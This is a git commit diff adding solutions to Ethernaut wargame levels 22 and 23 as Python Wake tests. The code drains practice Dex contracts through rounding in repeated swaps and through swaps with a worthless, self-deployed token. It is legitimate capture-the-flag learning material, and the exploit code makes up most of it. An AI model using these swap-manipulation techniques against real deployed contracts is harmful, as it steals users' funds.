e7de37a96b780730127d83e78238bfbcb344e7c3
honzaprevratil <honzikprevratil@gmail.com>
2024-04-11 19:47:11 +0200

    ✨ lvl 22 and lvl 23 solution

--- tests/lv22_dex_test.py
+++ tests/lv22_dex_test.py
@@ -1,17 +1,57 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
-from pytypes.contracts.lv22_dex import Dex
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.lv22_dex import Dex, SwappableToken
+from typing import List
 
 @default_chain.connect()
 def test_lv22():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv22()
-    exploit_lv22(contract)
+    exploit_lv22(contract, ethernaut.attacker)
     ethernaut.check_lv22(contract)
 
-def exploit_lv22(contract: Dex):
-    # TODO ?
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+def exploit_lv22(contract: Dex, attacker: Account):
+    # Attack vector: inteeger division (rounding down in favor of the attacker)
+    t1 = SwappableToken(contract.token1())
+    t2 = SwappableToken(contract.token2())
+    contract.approve(contract.address, 1000)
+
+    resolver = DexTransactionResolver([t1, t2], contract, attacker)
+    resolver.print_balances()
+
+    for i in range(10):
+        resolver.do_swap(t1, t2)
+        resolver.do_swap(t2, t1)
+
+class DexTransactionResolver:
+    tokens: List[SwappableToken]
+    dex: Dex
+    attacker: Account
+
+    def __init__(self, tokens: List[SwappableToken], dex: Dex, attacker: Account):
+        self.tokens = tokens 
+        self.dex = dex 
+        self.attacker = attacker
+
+    def do_swap(self, fromToken: SwappableToken, toToken: SwappableToken):
+        attacker_tokens = fromToken.balanceOf(self.attacker.address)
+        dex_tokens = fromToken.balanceOf(self.dex.address)
+        amount = attacker_tokens if attacker_tokens < dex_tokens else dex_tokens
+        if amount <= 0 or toToken.balanceOf(self.dex.address) == 0:
+            return
+        self.dex.swap(fromToken.address, toToken.address, amount)
+        self.print_swap(fromToken, toToken, amount)
+
+    def print_swap(self, fromToken: SwappableToken, toToken: SwappableToken, amount: int):
+        print(f"Swapping:  {amount} ({fromToken.symbol()} -> {toToken.symbol()})")
+        self.print_balances()
+
+    def print_balances(self):
+        self.print_balances_of(f"Dex:      ", self.dex)
+        self.print_balances_of(f"Attacker: ", self.attacker)
+        print()
+    
+    def print_balances_of(self, entity: str, address: Address):
+        print(entity, end=" ")
+        for token in self.tokens: print(f"{token.balanceOf(address)} {token.symbol()}", end="   ")
+        print()
--- tests/lv23_dex_two_test.py
+++ tests/lv23_dex_two_test.py
@@ -1,17 +1,30 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
-from pytypes.contracts.lv23_dex_two import DexTwo
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.lv23_dex_two import DexTwo, SwappableTokenTwo
+from tests.lv22_dex_test import DexTransactionResolver
 
 @default_chain.connect()
 def test_lv23():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv23()
-    exploit_lv23(contract)
+    exploit_lv23(contract, ethernaut.attacker)
     ethernaut.check_lv23(contract)
 
-def exploit_lv23(contract: DexTwo):
-    # TODO ?
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+def exploit_lv23(contract: DexTwo, attacker: Account):
+    # Attack vector: inteeger division (rounding down in favor of the attacker) + unchecked token swap
+    t1 = SwappableTokenTwo(contract.token1())
+    t2 = SwappableTokenTwo(contract.token2())
+    attack_token = SwappableTokenTwo.deploy(contract.address, "No value token :)", "SHT1", 1000)
+
+    contract.approve(contract.address, 1000)
+    attack_token.approve(attacker.address, contract.address, 1000)
+    attack_token.transfer(contract.address, 100)
+
+    resolver = DexTransactionResolver([t1, t2, attack_token], contract, attacker)
+    resolver.print_balances()
+
+    contract.swap(attack_token.address, t1.address, 100)
+    resolver.print_swap(attack_token, t1, 100)
+
+    contract.swap(attack_token.address, t2.address, 200)
+    resolver.print_swap(attack_token, t2, 200)
